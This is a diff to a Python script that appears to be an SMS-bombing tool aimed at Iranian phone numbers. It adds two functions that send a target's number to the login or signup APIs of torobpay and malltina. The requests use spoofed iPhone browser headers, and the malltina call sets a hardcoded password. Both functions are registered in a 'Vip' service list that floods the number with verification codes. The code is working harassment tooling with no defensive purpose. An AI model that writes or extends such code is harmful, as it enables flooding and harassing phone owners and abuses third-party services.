@@ -54,6 +54,72 @@ def check_internet():
 # ------------------------------
 
 
+def torobpay(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://api.torobpay.com/user/v1/login/?source=mobile&http_referrer=https%3A%2F%2Fwww.google.com%2F"
+    
+    payload = {
+        "phone_number": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "X-CSRFTOKEN": "",
+        "Origin": "https://torobpay.com",
+        "Referer": "https://torobpay.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(torobpay) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (torobpay) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] torobpay Exception: {e}{a}')
+        return False
+
+def malltina(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://api.malltina.com/profiles"
+    
+    payload = {
+        "password": "mM12345678",
+        "mobile": formatted_phone,
+        "sign_up_referral_link": "https://www.google.com/"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.malltina.com",
+        "Referer": "https://www.malltina.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(malltina) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (malltina) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] malltina Exception: {e}{a}')
+        return False
 
 
 def missomister(phone):
@@ -260,6 +326,8 @@ def Vip(phone, Time):
     tapsi_food, 
     candom_shop,
     missomister,
+    torobpay,
+    malltina,  # اضافه کردن این خط
 ]
     total_services = len(services)
 
